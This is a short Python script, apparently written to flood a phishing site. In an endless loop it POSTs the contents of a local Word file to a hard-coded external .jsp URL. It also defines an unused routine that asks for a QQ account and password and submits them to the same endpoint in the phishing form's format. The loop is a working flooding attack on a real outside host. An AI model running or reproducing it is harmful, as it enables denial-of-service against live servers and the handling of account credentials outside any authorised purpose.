import json
import requests
import urllib
url="http://hbakhc.hegongsh66.cn//qUUSxp/sxbeh0.jsp"
f=open("D:\DOCUMENT\SYSTEMSETTING\DESKTOP\Question.docx","rb")
a=f.read()
f.close()
def POST(post_data):
    try:
        #post 请求头
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36",
            "Cookie": None}
        req = requests.post(url,data=post_data,headers=headers)
        if req.status_code==200:
            print("-----------发送成功-----------\n")
        else:
            print("发送失败:",req.status_code)
        #print(req.text)
    except:
        print("网络错误")
#u=123456789&p=nishidashabi&submit=
def main():
    user=input("输入QQ账号: ")
    p=input("输入QQ密码: ")
    user=urllib.parse.quote(user, 'utf-8')
    p=urllib.parse.quote(p, 'utf-8')
    msg="u="+user+"&p="+p+"&submit="
    POST(msg)
size=0
while 1:
    POST(a)
    size+=41
    print("You have posted",size,"M thash to the seriver")
